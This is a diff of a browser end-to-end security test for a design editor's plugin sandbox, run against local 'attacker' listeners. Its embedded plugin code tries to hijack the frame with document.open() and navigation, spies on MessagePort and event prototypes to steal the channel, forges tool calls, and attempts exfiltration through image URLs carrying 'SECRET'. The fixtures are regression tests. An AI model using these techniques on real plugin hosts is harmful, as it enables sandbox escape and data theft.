@@ -1,12 +1,12 @@
 // Round 15, r15a: plugin sandbox security. Re-runs QA round 15's attacks (Z-01) against a local
-// attacker server and checks the fixes: the per-run token (a document that replaces the plugin in its
+// attacker server and checks the fixes: the MessagePort channel (a document that replaces the plugin in its
 // frame can neither read nor write the document, and its pongs keep nothing alive), the editor's
 // frame-src (navigation to another origin is refused before any request is made), the stop on
 // navigation signals, SVG namespaces (Z-02), reply authors (Z-05), un-awaited errors toast, save_plugin
 // refusing bad code (X-11), and that normal plugins and other iframes still work.
 //
 // Local servers only. The "attacker" is a pair of local listeners on ATTACKER_PORT: 127.0.0.1 (inside
-// the editor's frame-src, so a page there can replace the plugin frame: the token must hold) and
+// the editor's frame-src, so a page there can replace the plugin frame: the port must hold) and
 // 127.0.0.2 (outside it: any request that reaches it is a failure). Every other request is aborted.
 // Usage: E2E_URL=http://127.0.0.1:6711 ATTACKER_PORT=6715 [E2E_OUT=dir] [E2E_DEV_URL=http://127.0.0.1:6716]
 //        node scripts/qa/r15a-e2e.mjs
@@ -112,36 +112,25 @@ async function open({ dropNavigating = false, userName = "" } = {}) {
         /* no storage */
       }
       // Every toast text, in order (the toast itself disappears after a few seconds).
-      // The run tokens the editor generates (16 random bytes as hex), so a test can tell a leak from noise.
-      window.__tokens = [];
-      const grv = crypto.getRandomValues.bind(crypto);
-      crypto.getRandomValues = (a) => {
-        const r = grv(a);
-        if (a instanceof Uint8Array && a.length === 16) window.__tokens.push(Array.from(a, (b) => b.toString(16).padStart(2, "0")).join(""));
-        return r;
-      };
+      // Every toast text, in order (the toast itself disappears after a few seconds).
       window.__toasts = [];
       new MutationObserver(() => {
         const t = document.querySelector(".toast");
         if (t && window.__toasts[window.__toasts.length - 1] !== t.textContent) window.__toasts.push(t.textContent);
       }).observe(document, { childList: true, subtree: true, characterData: true });
       if (dropNav) {
-        // Test shim for the token-only check: the editor never sees a `navigating` message, as if
-        // that signal did not exist. The wrapped listener keeps working for everything else.
-        const orig = EventTarget.prototype.addEventListener;
-        const wrapped = new WeakMap();
-        EventTarget.prototype.addEventListener = function (type, fn, opts) {
-          if (this === window && type === "message" && typeof fn === "function") {
-            const w = (e) => (e.data && e.data.navigating ? undefined : fn.call(this, e));
-            wrapped.set(fn, w);
-            return orig.call(this, type, w, opts);
-          }
-          return orig.call(this, type, fn, opts);
-        };
-        const origRemove = EventTarget.prototype.removeEventListener;
-        EventTarget.prototype.removeEventListener = function (type, fn, opts) {
-          return origRemove.call(this, type, wrapped.get(fn) ?? fn, opts);
-        };
+        // Test shim for the signal-suppressed check: the editor never sees a `navigating` message on the
+        // plugin port, as if that signal did not exist. Everything else is delivered as usual.
+        const d = Object.getOwnPropertyDescriptor(MessagePort.prototype, "onmessage");
+        Object.defineProperty(MessagePort.prototype, "onmessage", {
+          configurable: true,
+          get() {
+            return d.get.call(this);
+          },
+          set(fn) {
+            d.set.call(this, typeof fn === "function" ? (e) => (e.data && e.data.navigating ? undefined : fn.call(this, e)) : fn);
+          },
+        });
       }
     },
     [dropNavigating, userName],
@@ -199,9 +188,9 @@ const reportMsgs = () => reports.filter((r) => r.kind === "msg");
 /** Anything the attacker page could only have received by being answered or handed a secret. */
 const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|result|"error"/.test(r.text ?? ""));
 
-// ---------- Z-01 A: token only (the editor is never told about the navigation) ----------
+// ---------- Z-01 A: the editor is never told about the navigation ----------
 {
-  console.log("\n# Z-01 A: replacing page, navigation signal suppressed (the token alone must hold)");
+  console.log("\n# Z-01 A: replacing page, navigation signal suppressed (the port alone must hold)");
   const { ctx, page } = await open({ dropNavigating: true });
   reports.length = 0;
   await addPlugin(page, "nh", `dt.notify("go"); setTimeout(() => { location.href = "${IN}/p.html"; }, 100); await new Promise(() => {});`, "Nav hang");
@@ -211,9 +200,9 @@ const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|r
   await sleep(8000);
   check("the plugin run is still alive (no load, no signal), as in the original attack", !!(await running(page)));
   check("no tool call from the replacing page was executed (no layer written)", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
-  check("the replacing page got no reply, no result and no token", answered().length === 0, JSON.stringify(answered().slice(0, 2)));
+  check("the replacing page got no reply, no ping and no event: nothing at all", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 2)));
   const b = await banner(page);
-  check("its pongs (without and with a guessed token) did not keep the run alive: 'isn't responding'", /isn't responding/.test(b ?? ""), b);
+  check("its pongs did not keep the run alive: 'isn't responding'", /isn't responding/.test(b ?? ""), b);
   await shot(page, "tokenonly-stuck");
   await page.getByRole("button", { name: "Stop" }).click();
   check("Stop works", (await waitStopped(page, 1500)) >= 0);
@@ -235,7 +224,7 @@ const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|r
   check("a toast says the plugin tried to navigate its frame", (await toasts(page)).some((t) => /tried to navigate its frame/.test(t)), JSON.stringify(await toasts(page)));
   check("the 'Running…' banner is gone and the frame is removed", (await banner(page)) === null && (await page.locator("iframe.plugin-frame").count()) === 0);
   check("no layer written by the replacing page", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
-  check("the replacing page was never answered", answered().length === 0, JSON.stringify(answered().slice(0, 2)));
+  check("the replacing page was sent nothing", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 2)));
   await ctx.close();
 }
 
@@ -292,55 +281,148 @@ const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|r
   await ctx.close();
 }
 
-// ---------- Z-01 D: token extraction attempts from plugin code ----------
+// ---------- Z-01 D: plugin code tries to get at the channel ----------
 {
-  console.log("\n# Z-01 D: plugin code tries to find the token");
+  console.log("\n# Z-01 D: plugin code tries to reach the port, the message event and the old window channel");
   const { ctx, page } = await open();
   reports.length = 0;
   const code = `
-    const found = new Set();
-    const note = (v) => { try { const s = typeof v === "string" ? v : JSON.stringify(v); for (const m of String(s).match(/[0-9a-f]{32}/g) || []) found.add(m); } catch (e) {} };
-    // Spies on everything the bootstrap uses to send, installed before the legitimate call.
-    try { Object.defineProperty(window, "parent", { value: { postMessage: (m) => note(m) }, configurable: true }); } catch (e) {}
+    const evType = typeof window.event; // the plugin must not start inside the message event
+    const ports = new Set();
+    const note = (v) => { try { if (v instanceof MessagePort) ports.add(v); if (v && v.target instanceof MessagePort) ports.add(v.target); if (v && v.ports) for (const p of v.ports) ports.add(p); } catch (e) {} };
+    // Spies on everything a port or a message event goes through, installed before the legitimate call.
+    for (const [proto, name] of [[MessagePort.prototype, "postMessage"], [MessagePort.prototype, "start"], [MessagePort.prototype, "close"], [MessagePort.prototype, "addEventListener"], [EventTarget.prototype, "addEventListener"], [EventTarget.prototype, "dispatchEvent"], [EventTarget.prototype, "removeEventListener"]]) {
+      const o = proto[name];
+      try { proto[name] = function () { note(this); for (const a of arguments) note(a); return o.apply(this, arguments); }; } catch (e) {}
+    }
+    for (const name of ["data", "ports", "source", "target", "currentTarget", "srcElement"]) {
+      for (const proto of [MessageEvent.prototype, Event.prototype]) {
+        const d = Object.getOwnPropertyDescriptor(proto, name);
+        if (d && d.get) try { Object.defineProperty(proto, name, { get() { note(this); return d.get.call(this); }, configurable: true }); } catch (e) {}
+      }
+    }
     const origThen = Promise.prototype.then;
-    Promise.prototype.then = function (a, b) { note(a && a.toString()); return origThen.call(this, a, b); };
+    Promise.prototype.then = function (a, b) { note(this); return origThen.call(this, a, b); };
     const origSet = Map.prototype.set;
     Map.prototype.set = function (k, v) { note(k); note(v); return origSet.call(this, k, v); };
-    const origStringify = JSON.stringify;
-    JSON.stringify = function (v) { note(v); return origStringify.apply(this, arguments); };
-    Object.defineProperty(Object.prototype, "token", { set(v) { note(v); }, get() { return undefined; }, configurable: true });
-    const origPost = window.top.postMessage.bind(window.top);
-    window.postMessage = function (m) { note(m); };
-    Error.prepareStackTrace = (e, sites) => { for (const s of sites) { try { note(s.getThis()); note(s.getFunction() && s.getFunction().toString()); } catch (x) {} } return ""; };
+    Object.defineProperty(Object.prototype, "ports", { set(v) { note({ ports: v }); }, get() { return undefined; }, configurable: true });
+    Error.prepareStackTrace = (e, sites) => { for (const s of sites) { try { note(s.getThis()); } catch (x) {} } return ""; };
     try { note(new Error().stack); } catch (e) {}
-    try { note(arguments.callee.caller && arguments.callee.caller.toString()); } catch (e) {}
-    const seen = [];
-    window.addEventListener("message", (e) => { note(e.data); seen.push(Object.keys(e.data || {}).join(",")); });
-    for (const k of Object.getOwnPropertyNames(window)) { try { if (/token/i.test(k)) note(window[k]); } catch (e) {} }
-    note(document.documentElement.outerHTML); note(window.name); note(dt.tool.toString()); note(String(dt.on));
-    // The legitimate call still works through all of that.
-    const legit = await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: "LEGIT", width: 10, height: 10 }] });
-    // Forged messages from the plugin itself: no token, and every candidate found.
-    const send = (m, o) => origPost(m, o);
-    send({ dtPlugin: true, id: 900, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED NO TOKEN", width: 5, height: 5 }] }] }, "*");
-    let i = 0;
-    for (const t of found) send({ dtPlugin: true, token: t, id: 901 + i++, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED WITH FOUND", width: 5, height: 5 }] }] }, "*");
-    send({ dtPlugin: true, token: "ffffffffffffffffffffffffffffffff", id: 950, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED GUESS", width: 5, height: 5 }] }] }, "*");
-    send({ dtPlugin: true, pong: true }, "*");
+    try { note(arguments.callee.caller); } catch (e) {}
+    let seen = 0;
+    window.addEventListener("message", () => seen++);
+    // The legitimate calls still work through all of that.
+    await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: "LEGIT", width: 10, height: 10 }] });
+    await dt.getDocument(1);
+    // Forged calls the old way (window messages with and without a token) and through any port found.
+    const send = (m) => window.top.postMessage(m, "*");
+    send({ dtPlugin: true, id: 900, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED WINDOW", width: 5, height: 5 }] }] });
+    send({ dtPlugin: true, token: "ffffffffffffffffffffffffffffffff", id: 950, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED GUESS", width: 5, height: 5 }] }] });
+    send({ dtPlugin: true, pong: true });
+    for (const p of ports) p.postMessage({ dtPlugin: true, id: 777, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "PORT FORGED", width: 5, height: 5 }] }] });
     await new Promise((r) => setTimeout(r, 1200));
-    dt.notify("candidates:" + found.size + " seen:" + seen.length + " list:" + [...found].join(","));
+    dt.notify("EVENT:" + evType + " PORTS:" + ports.size + " WINDOWMSGS:" + seen);
   `;
-  await addPlugin(page, "tok", code, "Token probe");
+  await addPlugin(page, "tok", code, "Channel probe");
   await run(page, "tok");
   const took = await waitStopped(page, 8000);
   await sleep(500);
   const ts = await toasts(page);
   check("the plugin ran to completion", took >= 0, `${took} ms; toasts ${JSON.stringify(ts)}`);
-  check("the legitimate call worked through the spies", (await named(page, "LEGIT")).length === 1);
-  check("no forged message was executed", (await nodes(page)).every((n) => !/^FORGED/.test(n.name ?? "")), (await nodes(page)).map((n) => n.name).join(","));
-  const tokens = await page.evaluate(() => window.__tokens);
-  const listed = (ts.join("|").match(/list:([0-9a-f,]*)/)?.[1] ?? "").split(",").filter(Boolean);
-  check("the plugin did not find the run's token anywhere it could look", tokens.length >= 1 && !listed.some((c) => tokens.includes(c)), `tokens ${tokens.length}, candidates ${JSON.stringify(listed)}`);
+  check("window.event is undefined on the plugin's first line", ts.some((t) => /EVENT:undefined /.test(t)), JSON.stringify(ts));
+  check("the legitimate calls worked through the spies", (await named(page, "LEGIT")).length === 1);
+  check("no port or message event ever reached plugin code", ts.some((t) => /PORTS:0 /.test(t)), JSON.stringify(ts));
+  check("no window message ever arrives in the plugin frame after the start", ts.some((t) => /WINDOWMSGS:0/.test(t)), JSON.stringify(ts));
+  check("no forged message was executed", (await nodes(page)).every((n) => !/FORGED/.test(n.name ?? "")), (await nodes(page)).map((n) => n.name).join(","));
+  await ctx.close();
+}
+
+// ---------- Z-01 G: steal attempt, document.open(), navigate to a hanging local page (review P4/P5) ----------
+{
+  console.log("\n# Z-01 G: document.open() erases the bootstrap's listeners, then the frame goes to a hanging local page");
+  const { ctx, page } = await open();
+  reports.length = 0;
+  await addPlugin(
+    page,
+    "ho",
+    `const ev = window.event;
+     const t = ev && ev.data && ev.data.token;
+     dt.notify("EVENT:" + typeof ev + " TOKEN:" + typeof t);
+     await new Promise((r) => setTimeout(r, 300));
+     document.open(); // erases every listener on this window, the bootstrap's pagehide/beforeunload included
+     location.href = "${IN}/p.html#" + t;
+     await new Promise(() => {});`,
+    "Handoff",
+  );
+  await run(page, "ho");
+  await sleep(2500);
+  const ts0 = await toasts(page);
+  check("the first line sees no event and no token", ts0.some((t) => /EVENT:undefined TOKEN:undefined/.test(t)), JSON.stringify(ts0));
+  check("the replacing page loaded in the frame", reports.some((r) => r.kind === "loaded"));
+  await sleep(7000);
+  check("it got no reply, no ping, no event, nothing at all", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 3)));
+  check("its tool calls were not executed (no layer written)", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
+  const b = await banner(page);
+  check("its pongs did not keep the run alive: the watchdog flags it ('isn't responding')", /isn't responding/.test(b ?? ""), b);
+  await page.getByRole("button", { name: "Stop" }).click();
+  check("Stop works", (await waitStopped(page, 1500)) >= 0);
+  await ctx.close();
+}
+
+// ---------- Z-01 H: a String wrapper in a tool input (review P1) ----------
+{
+  console.log("\n# Z-01 H: new String(url) in a tool input");
+  const { ctx, page } = await open();
+  const before = outsideHits().length;
+  await addPlugin(
+    page,
+    "sw",
+    `const out = [];
+     for (const [label, v] of [["plain", "${OUTSIDE}/plain.png"], ["wrapped", new String("${OUTSIDE}/leak.png?d=SECRET")], ["nested", [new String("${OUTSIDE}/nested.png")]]]) {
+       try { await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: label.toUpperCase(), width: 50, height: 50, imageUrl: v }] }); out.push(label + ":accepted"); } catch (e) { out.push(label + ":refused"); }
+     }
+     dt.notify("SW " + out.join(","));`,
+    "String wrapper",
+  );
+  await run(page, "sw");
+  await waitStopped(page, 5000);
+  await sleep(1500);
+  const ts = await toasts(page);
+  check("plain, wrapped and nested web addresses are all refused", ts.some((t) => /SW plain:refused,wrapped:refused,nested:refused/.test(t)), JSON.stringify(ts));
+  check("no layer was created for them", (await nodes(page)).every((n) => !/^(PLAIN|WRAPPED|NESTED)$/.test(n.name ?? "")));
+  check("nothing was fetched from the attacker origin", outsideHits().length === before, `${outsideHits().length - before} hits`);
+  await ctx.close();
+}
+
+// ---------- Z-01 I: the editor must not boot inside a plugin frame (review P2) ----------
+{
+  console.log("\n# Z-01 I: navigating the plugin frame to the editor itself (127.0.0.1, inside frame-src)");
+  const { ctx, page } = await open();
+  const before = outsideHits().length;
+  const wasmFromFrame = [];
+  const scriptsFromFrame = [];
+  const sockets = [];
+  page.on("request", (r) => {
+    if (r.frame() === page.mainFrame()) return;
+    if (/\.wasm(\?|$)/.test(r.url())) wasmFromFrame.push(r.url());
+    if (/\.(js|tsx)(\?|$)/.test(r.url())) scriptsFromFrame.push(r.url());
+  });
+  page.on("websocket", (ws) => sockets.push(ws.url()));
+  await addPlugin(
+    page,
+    "ed",
+    `await new Promise((r) => setTimeout(r, 200));
+     document.open();
+     location.href = "${URL}/?room=SECRETROOM&relay=${OUTSIDE}";
+     await new Promise(() => {});`,
+    "Editor in frame",
+  );
+  await run(page, "ed");
+  await sleep(4000);
+  check("(control) the editor's own script did load in the plugin frame", scriptsFromFrame.length > 0, scriptsFromFrame.slice(0, 2).join(","));
+  check("the editor loaded in the plugin frame boots no engine", wasmFromFrame.length === 0, wasmFromFrame.join(","));
+  check("it opens no connection for the room or the relay", !sockets.some((u) => /SECRETROOM|127\.0\.0\.2/.test(u)), sockets.join(","));
+  check("nothing reached the attacker origin", outsideHits().length === before);
   await ctx.close();
 }
 
@@ -547,6 +629,22 @@ const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|r
   await waitStopped(page, 4000);
   msgs = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => m[0] ?? m.author), cid);
   check("Z-05: the author is cut to 80 characters", Math.max(...msgs.map((a) => a.length)) <= 80 && msgs.some((a) => a.length === 80), JSON.stringify(msgs.map((a) => a.length)));
+
+  // Z-05: a name cut in the middle of a surrogate pair, and control characters in the name.
+  const emojiName = "a".repeat(71) + "\u{1F600}" + "tail";
+  await addPlugin(page, "reply3", `try { await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Emoji" }); dt.notify("REPLY OK"); } catch (e) { dt.notify("REPLY FAILED: " + e.message); }`, emojiName);
+  await run(page, "reply3");
+  await waitStopped(page, 4000);
+  await sleep(300);
+  await addPlugin(page, "reply4", `await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Control" });`, "Line\nbreak\u0007 name");
+  await run(page, "reply4");
+  await waitStopped(page, 4000);
+  await sleep(300);
+  const all = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => [m.author, m.text]), cid);
+  const emojiAuthor = all.find(([, t]) => t === "Emoji")?.[0] ?? "";
+  check("Z-05: an author cut inside an emoji does not fail the reply and stays well formed", (await toasts(page)).some((t) => /REPLY OK/.test(t)) && Array.from(emojiAuthor).length === 80 && emojiAuthor === emojiAuthor.toWellFormed(), JSON.stringify(emojiAuthor));
+  const ctrlAuthor = all.find(([, t]) => t === "Control")?.[0] ?? "";
+  check("Z-05: control characters and newlines in a plugin name become spaces", /^[^\u0000-\u001f\u007f-\u009f]+$/.test(ctrlAuthor) && ctrlAuthor.endsWith("Line break  name"), JSON.stringify(ctrlAuthor));
 
   // Un-awaited failure
   await addPlugin(page, "unawaited", `dt.tool("update_nodes", { updates: [{ id: "n_missing", name: "x" }] }); await new Promise((r) => setTimeout(r, 1200)); dt.notify("still running");`, "Forgetful");
